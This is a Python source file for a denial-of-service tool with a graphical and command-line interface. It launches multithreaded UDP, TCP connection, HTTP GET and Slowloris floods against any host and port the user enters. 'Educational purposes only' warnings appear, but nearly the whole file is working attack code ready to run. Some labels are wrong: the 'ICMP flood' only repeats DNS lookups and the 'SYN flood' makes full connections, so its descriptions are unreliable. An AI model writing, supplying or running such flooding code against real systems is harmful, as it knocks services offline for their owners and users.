#modules
import socket
import threading
import argparse
import time
import sys
from typing import Optional
import random
import string
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from datetime import datetime

class DDoSTool:
    def __init__(self, target: str, port: int, duration: int, threads: int, gui_callback=None):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_flag = False
        self.packets_sent = 0
        self.lock = threading.Lock()
        self.gui_callback = gui_callback
        
    def log(self, message: str):
        """Thread-safe logging"""
        with self.lock:
            print(f"[*] {message}")
            if self.gui_callback:
                self.gui_callback(message)
    #attack methods
    def udp_flood(self, packet_size: int = 1024):
        """UDP flood attack"""
        self.log(f"Starting UDP flood on {self.target}:{self.port}")
        start_time = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random.randbytes(packet_size)
            
            while not self.stop_flag and (time.time() - start_time) < self.duration:
                try:
                    sock.sendto(data, (self.target, self.port))
                    with self.lock:
                        self.packets_sent += 1
                except Exception as e:
                    self.log(f"UDP flood error: {e}")
                    break
            sock.close()
        except Exception as e:
            self.log(f"Failed to create UDP socket: {e}")
    
    def tcp_syn_flood(self):
        """TCP SYN flood attack"""
        self.log(f"Starting TCP SYN flood on {self.target}:{self.port}")
        start_time = time.time()
        
        try:
            while not self.stop_flag and (time.time() - start_time) < self.duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect_ex((self.target, self.port))
                    with self.lock:
                        self.packets_sent += 1
                except Exception as e:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
        except Exception as e:
            self.log(f"TCP SYN flood error: {e}")
    
    def http_flood(self):
        """HTTP GET/POST flood attack"""
        self.log(f"Starting HTTP flood on {self.target}:{self.port}")
        start_time = time.time()
        
        try:
            while not self.stop_flag and (time.time() - start_time) < self.duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target, self.port))
                    
                    # Random path and headers
                    path = '/' + ''.join(random.choices(string.ascii_letters, k=10))
                    http_request = f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\nConnection: close\r\n\r\n"
                    
                    sock.send(http_request.encode())
                    with self.lock:
                        self.packets_sent += 1
                    sock.close()
                except Exception as e:
                    pass
        except Exception as e:
            self.log(f"HTTP flood error: {e}")
    
    def icmp_echo_flood(self):
        """ICMP Echo (Ping) flood attack"""
        self.log(f"Starting ICMP flood on {self.target}")
        start_time = time.time()
        
        try:
            
            while not self.stop_flag and (time.time() - start_time) < self.duration:
                try:
                    response = socket.gethostbyname(self.target)
                    with self.lock:
                        self.packets_sent += 1
                except Exception as e:
                    self.log(f"ICMP error: {e}")
                    break
        except Exception as e:
            self.log(f"ICMP flood error: {e}")
    
    def slowloris_attack(self):
        """Slowloris attack - sends slow HTTP requests"""
        self.log(f"Starting Slowloris attack on {self.target}:{self.port}")
        
        try:
            for _ in range(min(self.threads, 20)):  # Limit connections
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target, self.port))
                    
                    # Send incomplete HTTP request
                    http_request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n"
                    sock.send(http_request.encode())
                    
                    with self.lock:
                        self.packets_sent += 1
                except Exception as e:
                    pass
        except Exception as e:
            self.log(f"Slowloris error: {e}")
    #start attack
    def start_attack(self, method: str):
        """Start the attack with specified method"""
        methods = {
            'udp': self.udp_flood,
            'tcp': self.tcp_syn_flood,
            'http': self.http_flood,
            'icmp': self.icmp_echo_flood,
            'slowloris': self.slowloris_attack
        }
        
        if method not in methods:
            self.log(f"Unknown method: {method}")
            return False
        
        self.log(f"Starting {method.upper()} attack")
        self.log(f"Target: {self.target}:{self.port}")
        self.log(f"Duration: {self.duration} seconds")
        self.log(f"Threads: {self.threads}")
        self.log("Attack in progress...\n")
        
        threads = []
        start_time = time.time()
        
        try:
            
            for i in range(self.threads):
                t = threading.Thread(target=methods[method], daemon=True)
                t.start()
                threads.append(t)
            
            
            def status_reporter():
                while not self.stop_flag:
                    elapsed = time.time() - start_time
                    if elapsed > 0:
                        rate = self.packets_sent / elapsed
                        self.log(f"Packets sent: {self.packets_sent} | Rate: {rate:.2f} pps")
                    time.sleep(5)
            
            reporter = threading.Thread(target=status_reporter, daemon=True)
            reporter.start()
            
            
            while (time.time() - start_time) < self.duration:
                time.sleep(1)
                if self.stop_flag:
                    break
        
        except KeyboardInterrupt:
            self.log("\nAttack stopped by user")
        finally:
            self.stop_flag = True
            time.sleep(0.5)
            
            elapsed = time.time() - start_time
            self.log(f"\n{'='*50}")
            self.log(f"Attack completed!")
            self.log(f"Total packets sent: {self.packets_sent}")
            self.log(f"Duration: {elapsed:.2f} seconds")
            if elapsed > 0:
                self.log(f"Average rate: {self.packets_sent/elapsed:.2f} packets/sec")
            self.log(f"{'='*50}")
            
        return True


class DDoSGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DDoS Tool - Educational Purpose Only")
        self.root.geometry("700x800")
        self.root.resizable(True, True)
        
        self.attack_thread = None
        self.tool = None
        
        # Set style
        style = ttk.Style()
        style.theme_use('clam')
        
        self.create_widgets()
        
    def create_widgets(self):
        """Create GUI widgets"""
        
        # Warning frame
        warning_frame = ttk.LabelFrame(self.root, text="⚠️  WARNING", padding=10)
        warning_frame.pack(fill=tk.X, padx=10, pady=10)
        
        warning_text = tk.Label(
            warning_frame,
            text="This tool is for educational purposes only!\nUnauthorized DDoS attacks are ILLEGAL.\nOnly test on systems you own or have permission to use.",
            fg="red",
            font=("Arial", 9, "bold"),
            wraplength=600,
            justify=tk.LEFT
        )
        warning_text.pack()
        
        # Configuration frame
        config_frame = ttk.LabelFrame(self.root, text="Attack Configuration", padding=10)
        config_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Target
        ttk.Label(config_frame, text="Target (IP/Domain):").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.target_entry = ttk.Entry(config_frame, width=30)
        self.target_entry.grid(row=0, column=1, sticky=tk.EW, padx=5)
        self.target_entry.insert(0, "127.0.0.1")
        
        # Port
        ttk.Label(config_frame, text="Port:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.port_entry = ttk.Entry(config_frame, width=30)
        self.port_entry.grid(row=1, column=1, sticky=tk.EW, padx=5)
        self.port_entry.insert(0, "80")
        
        # Duration
        ttk.Label(config_frame, text="Duration (seconds):").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.duration_entry = ttk.Entry(config_frame, width=30)
        self.duration_entry.grid(row=2, column=1, sticky=tk.EW, padx=5)
        self.duration_entry.insert(0, "60")
        
        # Threads
        ttk.Label(config_frame, text="Number of Threads:").grid(row=3, column=0, sticky=tk.W, pady=5)
        self.threads_entry = ttk.Entry(config_frame, width=30)
        self.threads_entry.grid(row=3, column=1, sticky=tk.EW, padx=5)
        self.threads_entry.insert(0, "10")
        
        # Attack method
        ttk.Label(config_frame, text="Attack Method:").grid(row=4, column=0, sticky=tk.W, pady=5)
        self.method_var = tk.StringVar(value="http")
        method_frame = ttk.Frame(config_frame)
        method_frame.grid(row=4, column=1, sticky=tk.W, padx=5)
        
        methods = ["http", "udp", "tcp", "icmp", "slowloris"]
        for method in methods:
            ttk.Radiobutton(
                method_frame,
                text=method.upper(),
                variable=self.method_var,
                value=method
            ).pack(side=tk.LEFT, padx=5)
        
        config_frame.columnconfigure(1, weight=1)
        
        # Button frame
        button_frame = ttk.Frame(self.root)
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_button = ttk.Button(
            button_frame,
            text="🚀 Start Attack",
            command=self.start_attack,
            width=20
        )
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(
            button_frame,
            text="⏹️  Stop Attack",
            command=self.stop_attack,
            width=20,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        self.clear_button = ttk.Button(
            button_frame,
            text="🧹 Clear Log",
            command=self.clear_log,
            width=20
        )
        self.clear_button.pack(side=tk.LEFT, padx=5)
        
        # Log frame
        log_frame = ttk.LabelFrame(self.root, text="Attack Log", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=20,
            width=80,
            bg="black",
            fg="lime",
            font=("Courier", 9)
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Status frame
        status_frame = ttk.Frame(self.root)
        status_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(status_frame, text="Status:").pack(side=tk.LEFT, padx=5)
        self.status_label = ttk.Label(status_frame, text="Ready", foreground="green")
        self.status_label.pack(side=tk.LEFT, padx=5)
        
    def log_message(self, message: str):
        """Add message to log"""
        self.log_text.config(state=tk.NORMAL)
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.root.update()
    
    def start_attack(self):
        """Start the attack"""
        try:
            target = self.target_entry.get().strip()
            port = int(self.port_entry.get().strip())
            duration = int(self.duration_entry.get().strip())
            threads = int(self.threads_entry.get().strip())
            method = self.method_var.get()
            
            if not target:
                messagebox.showerror("Error", "Please enter a target")
                return
            
            if port < 1 or port > 65535:
                messagebox.showerror("Error", "Port must be between 1 and 65535")
                return
            
            if duration < 1:
                messagebox.showerror("Error", "Duration must be at least 1 second")
                return
            
            if threads < 1:
                messagebox.showerror("Error", "Must have at least 1 thread")
                return

            # Confirmation dialog
            response = messagebox.askyesno(
                "Confirm Attack",
                f"Target: {target}:{port}\nMethod: {method.upper()}\nDuration: {duration}s\nThreads: {threads}\n\nContinue?",
                icon=messagebox.WARNING
            )
            
            if not response:
                return
            
            self.clear_log()
            self.log_message("WARNING: Educational purposes only!")
            self.log_message("Unauthorized attacks are illegal.")
            self.log_message("")
            
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.status_label.config(text="Running...", foreground="orange")
            
            self.tool = DDoSTool(target, port, duration, threads, self.log_message)
            self.attack_thread = threading.Thread(
                target=self._run_attack,
                args=(method,),
                daemon=True
            )
            self.attack_thread.start()
            
        except ValueError as e:
            messagebox.showerror("Error", "Invalid input. Check your parameters.")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")
    
    def _run_attack(self, method):
        """Run attack in thread"""
        try:
            self.tool.start_attack(method)
        except Exception as e:
            self.log_message(f"ERROR: {e}")
        finally:
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.status_label.config(text="Stopped", foreground="red")
    
    def stop_attack(self):
        """Stop the attack"""
        if self.tool:
            self.tool.stop_flag = True
            self.log_message("Stopping attack...")
    
    def clear_log(self):
        """Clear the log"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)


def main():
    parser = argparse.ArgumentParser(
        description="DDoS Tool - Educational Purpose Only",
        add_help=True
    )
    
    parser.add_argument('--cli', action='store_true', help='Use command-line interface instead of GUI')
    parser.add_argument('-t', '--target', help='Target IP or domain (CLI mode)')
    parser.add_argument('-p', '--port', type=int, help='Target port (CLI mode)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('-m', '--method', choices=['udp', 'tcp', 'http', 'icmp', 'slowloris'], help='Attack method (CLI mode)')
    parser.add_argument('-th', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    
    args = parser.parse_args()
    
    # CLI 
    if args.cli:
        if not args.target or not args.method:
            print("Error: --target and --method are required in CLI mode")
            sys.exit(1)
        
        print("\n" + "="*60)
        print("WARNING: This tool is for educational purposes only!")
        print("Unauthorized DDoS attacks are illegal and unethical.")
        print("Only use this tool on systems you own or have permission to test.")
        print("="*60 + "\n")
        
        response = input(f"Target: {args.target}:{args.port}\nMethod: {args.method}\nDuration: {args.duration}s\nThreads: {args.threads}\n\nContinue? (yes/no): ").lower()
        
        if response not in ['yes', 'y']:
            print("Attack cancelled.")
            sys.exit(0)
        
        print()
        tool = DDoSTool(args.target, args.port, args.duration, args.threads)
        tool.start_attack(args.method)
    
    
    else:
        root = tk.Tk()
        gui = DDoSGUI(root)
        root.mainloop()


if __name__ == '__main__':
    main()
